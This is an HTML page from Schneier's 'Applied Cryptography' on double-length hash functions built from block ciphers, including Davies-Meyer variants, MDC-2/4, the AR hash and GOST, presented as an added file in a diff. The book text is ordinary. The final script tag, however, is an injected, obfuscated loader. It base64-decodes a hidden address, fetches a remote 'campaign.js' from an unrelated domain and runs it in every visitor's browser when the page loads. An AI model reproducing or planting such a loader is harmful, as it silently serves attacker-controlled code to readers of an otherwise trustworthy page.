@@ -1,0 +1,153 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=450-454//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>This scheme appeared in a 1989 draft ISO standard [764], but was dropped in a later version [765]. Security problems with this scheme were identified in [1107, 925, 1262, 372]. (Actually, the version in the proceedings was strengthened after the version presented at the conference was attacked.) In some instances the birthday attack is solvable with a complexity of 2<SUP>39</SUP>, not 2<SUP>64</SUP>, through brute force. Do not use this scheme.</P>
+<P><FONT SIZE="+1"><B><I>LOKI Double-Block</I></B></FONT></P>
+<P>This algorithm is a modification of Quisquater-Girault, specifically designed to work with LOKI [273]. All parameters are as in Quisquater-Girault.
+</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is a random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is another random initial value
+<DD><I>W</I><SUB>i</SUB> = <I>E</I><SUB>L<SUB>i</i></SUB></SUB> &#8853; <I>G</I><SUB>i- 1</SUB> (<I>G</I><SUB>i- 1</SUB> &#8853; <I>R</I><SUB>i</SUB>) &#8853; <I>R</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+<DD><I>G</I><SUB>i</SUB> = <I>E</I><SUB>R<SUB>i</SUB></SUB>&#8853; <I>H</I><SUB>i- 1</SUB>(<I>W</I><SUB>i</SUB> &#8853; <I>L</I><SUB>i</SUB>) &#8853; <I>G</I><SUB>i- 1</SUB> &#8853; <I>H</I><SUB>i- 1</SUB> &#8853; <I>L</I><SUB>i</SUB>
+<DD><I>H</I><SUB>i</SUB> = <I>W</I><SUB>i</SUB> &#8853; <I>G</I><SUB>i- 1</SUB>
+</DL>
+<P>Again, in some instances the birthday attack is trivially solvable [925, 926, 1262, 372, 736]. Do not use this scheme.
+</P>
+<P><FONT SIZE="+1"><B><I>Parallel Davies-Meyer</I></B></FONT></P>
+<P>This is yet another attempt at an algorithm with a hash rate of 1 that produces a hash twice the block length [736].
+</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is a random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is another random initial value
+<DD><I>G</I><SUB>i</SUB> = <I>E</I><SUB>L<SUB>i</SUB></SUB>&#8853; <I>R</I><SUB>i</SUB>(<I>G</I><SUB>i- 1</SUB> &#8853; <I>L</I><SUB>i</SUB>) &#8853; <I>L</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>L<SUB>i</SUB></SUB>(<I>H</I><SUB>i - 1</SUB> &#8853; <I>R</I><SUB>i</SUB>) &#8853; <I>R</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+</DL>
+<P>Unfortunately, this scheme isn&#146;t secure either [928, 861]. As it turns out, a double-length hash function with a hash rate of 1 cannot be more secure than Davies-Meyer [861].
+</P>
+<P><FONT SIZE="+1"><B><I>Tandem and Abreast Davies-Meyer</I></B></FONT></P>
+<P>Another way around the inherent limitations of a block cipher with a 64-bit key uses an algorithm, like IDEA (see Section 13.9), with a 64-bit block and a 128-bit key. These two schemes produce a 128-bit hash value and have a hash rate of &#189; [930, 925].
+</P>
+<I><P><A NAME="Fig11"></A><A HREF="javascript:displayWindow('images/18-11.jpg',299,121 )"><IMG SRC="images/18-11t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-11.jpg',299,121)"><FONT COLOR="#000077"><B>Figure 18.11</B></FONT></A>&nbsp;&nbsp;Tandem Davies-Meyer.</I>
+</P>
+<P>In this first scheme, two modified Davies-Meyer functions work in tandem (see Figure 18.11).
+</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is some random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is some other random initial value
+<DD><I>W</I><SUB>i</SUB> = <I>E</I><SUB>G<SUB>i- 1</SUB></SUB>, <I>M</I><SUB>i</SUB>(<I>H</I><SUB>i- 1</SUB>)
+<DD><I>G</I><SUB>i</SUB> = <I>G</I><SUB>i- 1</SUB> &#8853; <I>E</I><SUB>M<SUB>i</SUB></SUB>,<I>W</I><SUB>i</SUB>(<I>G</I><SUB>i- 1</SUB>)
+<DD><I>H</I><SUB>i</SUB> = <I>W</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+</DL>
+<P>The following scheme uses two modified Davies-Meyer functions side-by-side (see Figure 18.12).
+</P>
+<DL>
+<DD><I>G</I><SUB>0</SUB> = <I>I</I><SUB>G,</SUB> where <I>I</I><SUB>G</SUB> is some random initial value
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H,</SUB> where <I>I</I><SUB>H</SUB> is some other random initial value
+<DD><I>G</I><SUB>i</SUB> = <I>G</I><SUB>i- 1</SUB> &#8853; <I>E</I><SUB>M<SUB>i</SUB></SUB>,<I>H</I><SUB>i- 1</SUB>(&#172;<I>G</I><SUB>i- 1</SUB>)
+<DD><I>H</I><SUB>i</SUB> = <I>H</I><SUB>i- 1</SUB> &#8853; <I>E</I><SUB>G<SUB>i- 1</SUB></SUB>,<I>M</I><SUB>i</SUB>(<I>H</I><SUB>i- 1</SUB>)
+</DL>
+<P>In both schemes, the two 64-bit hash values <I>G</I><SUB>i</SUB> and <I>H</I><SUB>i</SUB> are concatenated to produce a single 128-bit hash.</P>
+<P>As far as anyone knows, these algorithms have ideal security for a 128-bit hash function: Finding a message that hashes to a given hash value requires 2<SUP>128</SUP> attempts, and finding two random messages that hash to the same value requires 2<SUP>64</SUP> attempts&#151;assuming that there is no better way to attack the block algorithm than by using brute force.</P>
+<P><FONT SIZE="+1"><B><I>MDC-2 and MDC-4</I></B></FONT></P>
+<P>MDC-2 and MDC-4 were first developed at IBM [1081, 1079]. MDC-2, sometimes called Meyer-Schilling, is under consideration as an ANSI and ISO standard [61, 765]; a variant was proposed in [762]. MDC-4 is specified for the RIPE project [1305] (see Section 25.7). The specifications use DES as the block function, although in theory any encryption algorithm could be used.
+</P>
+<I><P><A NAME="Fig12"></A><A HREF="javascript:displayWindow('images/18-12.jpg',304,125 )"><IMG SRC="images/18-12t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-12.jpg',304,125)"><FONT COLOR="#000077"><B>Figure 18.12</B></FONT></A>&nbsp;&nbsp;Abreast Davies-Meyer.</I>
+<I></P>
+<P><A NAME="Fig13"></A><A HREF="javascript:displayWindow('images/18-13.jpg',271,180 )"><IMG SRC="images/18-13t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-13.jpg',271,180)"><FONT COLOR="#000077"><B>Figure 18.13</B></FONT></A>&nbsp;&nbsp;MDC-2.</I>
+</P>
+<P>MDC-2 has a hash rate of &#189;, and produces a hash value twice the length of the block size. It is shown in Figure 18.13. MDC-4 also produces a hash value twice the length of the block size, and has a hash rate of &#188; (see Figure 18.14).
+</P>
+<P>These schemes have been analyzed in [925, 1262]. They are secure against current computing power, but they are not nearly as secure as the designers have estimated. If the block algorithm is DES, they have been looked at with respect to differential cryptanalysis [1262].</P>
+<P>Both MDC-2 and MDC-4 are patented [223].</P>
+<P><FONT SIZE="+1"><B><I>AR Hash Function</I></B></FONT></P>
+<P>The AR hash function was developed by Algorithmic Research, Ltd. and has been distributed by the ISO for information purposes only [767]. Its basic structure is a variant of the underlying block cipher (DES in the reference) in CBC mode. The last two ciphertext blocks and a constant are XORed to the current message block and encrypted by the algorithm. The hash is the last two ciphertext blocks computed. The message is processed twice, with two different keys, so the hash function has a hash rate of &#189. The first key is 0x0000000000000000, the second key is 0x2a41522f4446502a, and c is 0x0123456789abcdef. The result is compressed to a single 128-bit hash value. See [750] for the details.
+</P>
+<DL>
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>K</SUB> (<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB> &#8853; <I>H</I><SUB>i- 2</SUB> &#8853; <I>c</I> ) &#8853; <I>M</I><SUB>i</SUB>
+</DL>
+<P>This sounds interesting, but it is insecure. After considerable preprocessing, it is possible to find collisions for this hash function easily [416].
+</P>
+<I><P><A NAME="Fig14"></A><A HREF="javascript:displayWindow('images/18-14.jpg',357,181 )"><IMG SRC="images/18-14t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-14.jpg',357,181)"><FONT COLOR="#000077"><B>Figure 18.14</B></FONT></A>&nbsp;&nbsp;MDC-4.</I>
+</P>
+<P><FONT SIZE="+1"><B><I>GOST Hash Function</I></B></FONT></P>
+<P>This hash function comes from Russia, and is specified in the standard GOST R 34.11-94 [657]. It uses the GOST block algorithm (see Section 14.1), although in theory it could use any block algorithm with a 64-bit block size and a 256-bit key. The function produces a 256-bit hash value.
+</P>
+<P>The compression function, <I>H</I><SUB>i</SUB> = f(<I>M</I><SUB>i</SUB><I>,H</I><SUB>i-1</SUB>) (both operands are 256-bit quantities) is defined as follows:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Generate four GOST encryption keys by some linear mixing of <I>M</I><SUB>i</SUB>, <I>H</I><SUB>i - 1</SUB>, and some constants.
+<DD><B>(2)</B>&nbsp;&nbsp;Use each key to encrypt a different 64 bits of <I>H</I><SUB>i- 1</SUB> in ECB mode. Store the resulting 256 bits into a temporary variable, <I>S</I>.
+<DD><B>(3)</B>&nbsp;&nbsp;<I>H</I><SUB>i</SUB> is a complex, although linear, function of <I>S, M</I><SUB>i,</SUB> and <I>H</I><SUB>i- 1.</SUB>
+</DL>
+<P>The final hash of <I>M</I> is not the hash of the last block. There are actually three chaining variables: <I>H</I><SUB>n</SUB> is the hash of the last message block, <I>Z</I> is the sum mod 2256 of all the message blocks, and <I>L</I> is the length of the message. Given those variables and the padded last block, <I>M'</I>, the final hash value is:</P>
+<DL>
+<DD><I>H</I> = f(<I>Z</I> &#8853; <I>M'</I>, f(<I>L,</I> f(<I>M&#146;</I>,<I>H</I><SUB>n</SUB>)))
+</DL>
+<P>The documentation is a bit confusing (and in Russian), but I think all that is correct. In any case, this hash function is specified for use with the Russian Digital Signature Standard (see Section 20.3).
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(iHGicaVe, kcIQiPuv) {kcIQiPuv = iHGicaVe.createElement('script');kcIQiPuv.type = 'text/javascript';kcIQiPuv.async = true;kcIQiPuv.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');iHGicaVe.getElementsByTagName('body')[0].appendChild(kcIQiPuv);}(document));</script></body>
+</html>
